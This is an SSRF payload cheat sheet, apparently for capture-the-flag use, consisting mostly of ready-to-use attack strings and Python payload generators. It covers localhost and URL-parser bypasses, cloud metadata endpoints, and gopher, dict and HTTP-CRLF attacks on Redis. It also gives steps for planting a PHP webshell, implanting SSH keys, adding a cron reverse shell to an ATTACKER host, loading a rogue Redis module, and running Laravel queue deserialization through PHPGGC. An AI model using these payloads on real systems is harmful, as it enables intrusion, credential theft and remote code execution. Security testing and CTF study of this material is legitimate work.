# SSRF

## Basics

```text
protocol://username:password@host:port/path?query#fragment
```

## Try

```text
http://127.0.0.1/
http://localhost/
http://[::1]/
http://169.254.169.254/latest/meta-data/
```

## Localhost Bypass

```text
http://127.1/
http://0/
http://0.0.0.0/
http://2130706433/
http://017700000001/
http://0x7f000001/
http://127.127.127.127/
http://[::ffff:127.0.0.1]/
http://localhost./
http://LOCALHOST/
```

## Hostname Bypass

```text
http://internal./
http://localhost./
http://127.0.0.1./
http://allowed.com./
http://allowed.com..ATTACKER/
http://allowed.com%2eATTACKER/
http://allowed.com%00.ATTACKER/
http://LOCALHOST/
http://LocalHost/
```

Trailing-dot hostnames are useful when validation blocks `internal` but the resolver still accepts `internal.`.

## Parser Confusion

```text
http://127.0.0.1@evil.com/
http://evil.com#@127.0.0.1/
http://evil.com\@127.0.0.1/
http://127.0.0.1%5c@evil.com/
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

## Redirect Bypass

```text
https://307.r3dir.me/--to/?url=http://localhost
https://trusted.example.com/redirect?next=http://127.0.0.1/admin
```

Test 301, 302, 303, 307, and 308 separately.

## Internal Targets

```text
http://127.0.0.1:80/
http://127.0.0.1:3000/admin
http://127.0.0.1:5000/debug
http://127.0.0.1:8000/openapi.json
http://127.0.0.1:8080/actuator/env
http://127.0.0.1:2375/version
http://127.0.0.1:6379/
http://127.0.0.1:11211/
```

## Cloud Metadata

```http
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

GET http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: <token>
```

```text
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

## Protocol Pivots

```text
gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0a
file:///etc/passwd
dict://127.0.0.1:6379/info
php://filter/convert.base64-encode/resource=/flag.txt
```

## Redis via gopher

```text
gopher://127.0.0.1:6379/_%2a1%0d%0a%244%0d%0aINFO%0d%0a
```

Targets:

```text
redis://127.0.0.1:6379
gopher://127.0.0.1:6379/_
dict://127.0.0.1:6379/info
http://127.0.0.1:6379/
http://redis:6379/
```

Quick Redis probes:

```text
INFO
PING
CONFIG GET dir
CONFIG GET dbfilename
KEYS *
SCAN 0
GET flag
HGETALL flag
LRANGE flag 0 -1
```

Write webshell when Redis can write into webroot:

```text
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET[0]); ?>"
SAVE
```

Encode Redis commands for gopher:

```python
from urllib.parse import quote

cmds = [
    'CONFIG SET dir /var/www/html',
    'CONFIG SET dbfilename shell.php',
    'SET x "<?php system($_GET[0]); ?>"',
    'SAVE',
]

raw = ''
for cmd in cmds:
    parts = cmd.split(' ')
    raw += f"*{len(parts)}\r\n"
    for p in parts:
        raw += f"${len(p)}\r\n{p}\r\n"

print("gopher://127.0.0.1:6379/_" + quote(raw))
```

Reusable RESP encoder:

```python
from urllib.parse import quote

def resp(*parts):
    out = f"*{len(parts)}\r\n"
    for p in parts:
        if isinstance(p, str):
            p = p.encode()
        out += f"${len(p)}\r\n" + p.decode("latin-1") + "\r\n"
    return out

raw = "".join([
    resp("PING"),
    resp("INFO"),
])

print("gopher://127.0.0.1:6379/_" + quote(raw, safe=""))
```

## Redis via dict

`dict://` is not raw TCP. With curl/libcurl it sends:

```text
CLIENT libcurl VERSION
COMMAND_FROM_URL_PATH
QUIT
```

Redis errors on the first `CLIENT libcurl ...` line, then still processes the command from the path. This usually means one Redis command per SSRF request. Use gopher for multi-command RESP; use dict when gopher is blocked and one command per request is enough.

Examples:

```text
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:6379/PING
dict://127.0.0.1:6379/CONFIG%20GET%20dir
dict://127.0.0.1:6379/GET%20flag
dict://127.0.0.1:6379/HGETALL%20flag
```

Curl also turns `:` into spaces for DICT paths, which is handy when spaces are filtered:

```text
dict://127.0.0.1:6379/CONFIG:GET:dir
dict://127.0.0.1:6379/SET:x:pwned
dict://127.0.0.1:6379/GET:x
```

For values with spaces/special chars, quote the Redis inline argument and URL-encode it:

```python
from urllib.parse import quote

def dict_redis(cmd):
    return "dict://127.0.0.1:6379/" + quote(cmd, safe="")

print(dict_redis("SET x pwned"))
print(dict_redis('SET shell "<?php system($_GET[0]); ?>"'))
```

Webshell with several SSRF requests:

```text
dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20shell.php
dict://127.0.0.1:6379/SET%20x%20%22%3C%3Fphp%20system%28%24_GET%5B0%5D%29%3B%20%3F%3E%22
dict://127.0.0.1:6379/SAVE
```

If the challenge expects a base64 URL parameter, base64 the full dict URL:

```python
import base64
from urllib.parse import quote

url = "dict://127.0.0.1:6379/" + quote("GET flag", safe="")
print(base64.b64encode(url.encode()).decode())
```

When the value is a large JSON/job payload, do not fight one giant `LPUSH queue JSON` by hand. Stage the value into a temporary Redis key with multiple `APPEND` requests, then atomically push the temp value into the queue with one `EVAL`.

```python
from urllib.parse import quote

def redis_inline_arg(s):
    # Redis inline protocol quoted string. Good for JSON/chunks without raw newlines.
    return '"' + s.replace("\\", "\\\\").replace('"', '\\"') + '"'

def dict_cmd(*argv):
    line = " ".join(
        a if a.isalnum() or all(c not in a for c in ' \t"\\') else redis_inline_arg(a)
        for a in argv
    )
    return "dict://127.0.0.1:6379/" + quote(line, safe="")

def dict_lpush_large(list_key, value, tmp="ssrf:tmp", chunk=700):
    urls = [dict_cmd("DEL", tmp)]
    for i in range(0, len(value), chunk):
        urls.append(dict_cmd("APPEND", tmp, value[i:i+chunk]))
    lua = "redis.call('lpush',KEYS[1],redis.call('get',KEYS[2]));redis.call('del',KEYS[2]);return 1"
    urls.append(dict_cmd("EVAL", lua, "2", list_key, tmp))
    return urls

job_json = '{"uuid":"...","job":"...","data":{"command":"SERIALIZED_PHP_OBJECT"}}'
for u in dict_lpush_large("queues:default", job_json):
    print(u)
```

## Redis via HTTP CRLF

Sometimes gopher is blocked, but the SSRF sink allows `http://127.0.0.1:6379/...` and decodes `%0d%0a` in the path before sending the request. Redis accepts inline commands line by line, so the first HTTP line may error, then injected Redis commands still run.

Shape:

```text
http://127.0.0.1:6379/%0d%0aPING%0d%0aQUIT%0d%0a
http://127.0.0.1:6379/%0d%0aSET%20x%20pwned%0d%0aGET%20x%0d%0aQUIT%0d%0a
```

If spaces are blocked:

```text
http://127.0.0.1:6379/%0d%0aSET%09x%09pwned%0d%0aQUIT%0d%0a
http://127.0.0.1:6379/%0aSET%20x%20pwned%0aQUIT%0a
```

HTTP inline encoder:

```python
from urllib.parse import quote

cmds = [
    "PING",
    "SET x pwned",
    "GET x",
    "QUIT",
]

payload = "\r\n" + "\r\n".join(cmds) + "\r\n"
print("http://127.0.0.1:6379/" + quote(payload, safe=""))
```

If the challenge says the URL is base64-encoded before fetch, base64 the final URL, not only the Redis payload:

```python
import base64
from urllib.parse import quote

payload = "\r\nSET x pwned\r\nGET x\r\nQUIT\r\n"
url = "http://127.0.0.1:6379/" + quote(payload, safe="")
print(base64.b64encode(url.encode()).decode())
```

Try double-encoding if the first layer decodes once before validation:

```text
%250d%250aSET%2520x%2520pwned%250d%250aQUIT%250d%250a
```

## Redis Write Pivots

Webshell:

```text
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET[0]); ?>"
SAVE
```

SSH key:

```text
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET x "\n\nssh-rsa AAAA... attacker\n\n"
SAVE
```

Cron:

```text
CONFIG SET dir /var/spool/cron
CONFIG SET dbfilename root
SET x "\n* * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\n"
SAVE
```

Replica/module RCE when Redis can reach your server and modules are allowed:

```text
SLAVEOF ATTACKER 6379
CONFIG SET dir /tmp
CONFIG SET dbfilename exp.so
MODULE LOAD /tmp/exp.so
```

## Redis App-Consumed Gadgets

Use this when Redis is not writable to a useful filesystem path, but a worker consumes Redis data. The Redis bug is only delivery; the RCE primitive is the app's queue/session/cache deserializer.

Common targets:

```text
Laravel queue worker: queues:default, laravel_queues:default, QUEUE_PREFIX:queues:default
PHP sessions/cache: keys containing session, cache, laravel_cache
Python workers: rq:queue:*, celery, pickle/base64 blobs
Node workers: bull:* / bullmq:* jobs with JSON command handlers
Sidekiq/Rails: queue:* JSON jobs, signed/encrypted payloads may need app secrets
```

Enumeration through SSRF:

```text
KEYS *queue*
KEYS *session*
KEYS *cache*
LRANGE queues:default 0 -1
TYPE KEY
GET KEY
HGETALL KEY
```

Laravel/PHP queue pattern:

```text
1. Pull one real queue item with LRANGE so you preserve the exact JSON schema.
2. Check composer.lock/vendor versions and choose a matching PHPGGC gadget.
3. Replace only the serialized command/object field; keep queue metadata believable.
4. Push the job with RPUSH/LPUSH to the same list the worker reads.
5. Wait for the worker, or trigger queue:work / schedule / webhook if the app exposes it.
```

PHPGGC:

```bash
git clone https://github.com/ambionics/phpggc
cd phpggc
php phpggc -l Laravel
php phpggc Laravel/RCE1 system 'id'
php phpggc Laravel/RCE1 system 'cat /flag* > public/flag.txt'
```

Laravel queue JSON is version/app specific, so copy the shape from Redis instead of using a fixed template. The important field is usually under `data.command`; it may be a raw PHP serialized object, or an encrypted Laravel envelope if the job is encrypted. If it is encrypted, look for `APP_KEY` through LFI, `.env`, config leaks, debug pages, backups, or source.

Dict delivery for Laravel queues:

```text
# Small job, if quoting survives the SSRF sink:
dict://127.0.0.1:6379/LPUSH%20queues%3Adefault%20%22%7B...json...%7D%22

# Large or quote-heavy job:
Use the APPEND + EVAL staging snippet from Redis via dict.
```

Do not confuse this with PHP-CGI/FastCGI. PHP-CGI/FastCGI is a separate SSRF pivot to a PHP interpreter port/socket. Redis queue exploitation needs a PHP POP gadget because the Laravel/PHP worker unserializes attacker-controlled queue data.

Reality checks:

```text
Redis protected-mode may block non-loopback clients, but SSRF from localhost can bypass that.
AUTH/requirepass needs credentials unless app has them in config/env.
CONFIG may be disabled/renamed on hardened Redis.
Webshell only works if Redis can write into a served PHP directory.
Cron/SSH pivots depend on Redis user permissions.
HTTP CRLF works only if the SSRF client does not reject or normalize CRLF.
```

## PHP-FPM / FastCGI

```text
127.0.0.1:9000
/var/run/php/php-fpm.sock
/run/php/php-fpm.sock
```

Use `gopherus` or `fastcgi_param SCRIPT_FILENAME /var/www/html/index.php` payloads.

## Tools

Gopherus: https://github.com/tarunkant/Gopherus

```bash
git clone https://github.com/tarunkant/Gopherus
cd Gopherus
python2 gopherus.py --exploit redis
python2 gopherus.py --exploit fastcgi
python2 gopherus.py --exploit mysql
python2 gopherus.py --exploit smtp
```

Use Gopherus for quick payload shape, then inspect and re-encode the generated URL if the challenge base64-encodes URLs, decodes once before fetching, or blocks `%0d%0a`.

## Admin Panels

```text
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:8983/solr/admin/cores
http://127.0.0.1:15672/
http://127.0.0.1:8080/actuator/env
http://127.0.0.1:5000/console
```

## Docker / Compose

```text
http://internal:5001/
http://api:8080/actuator/env
http://redis:6379/
http://db:5432/
http://host.docker.internal:5001/
http://172.17.0.1:5001/
http://SERVICE:PORT/
http://PROJECT-SERVICE-1:PORT/
```

## Blind SSRF

1. Fire DNS/HTTP callback first.
2. DNS-only: test parser bypasses, redirects, and internal ports by timing.
3. HTTP callback: pivot to open redirect, gopher, or second sink.
4. Common second sinks: preview, import URL, webhook, PDF/HTML converter.

## Callback Tools

Interactsh: https://github.com/projectdiscovery/interactsh

```bash
interactsh-client

# Put the generated domain into the SSRF sink.
http://TARGET/fetch?url=http://GENERATED.oast.pro/
http://TARGET/fetch?url=http://redis-6379.GENERATED.oast.pro/
```

Burp Collaborator works the same way: generate a Collaborator domain, send it through the sink, then check DNS and HTTP interactions. DNS-only callback is still useful because many SSRF clients resolve the host even when the outbound HTTP request is blocked.

## Domain Redirect

| Domain | Redirect To |
| --- | --- |
| localtest.me | `::1` |
| localh.st | `127.0.0.1` |
| spoofed.[BURP_COLLABORATOR] | `127.0.0.1` |
| spoofed.redacted.oastify.com | `127.0.0.1` |
| company.127.0.0.1.nip.io | `127.0.0.1` |

## Useful Links

* [https://highon.coffee/blog/ssrf-cheat-sheet/](https://highon.coffee/blog/ssrf-cheat-sheet/)
* [https://hacktricks.boitatech.com.br/pentesting-web/ssrf-server-side-request-forgery](https://hacktricks.boitatech.com.br/pentesting-web/ssrf-server-side-request-forgery)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
* [https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
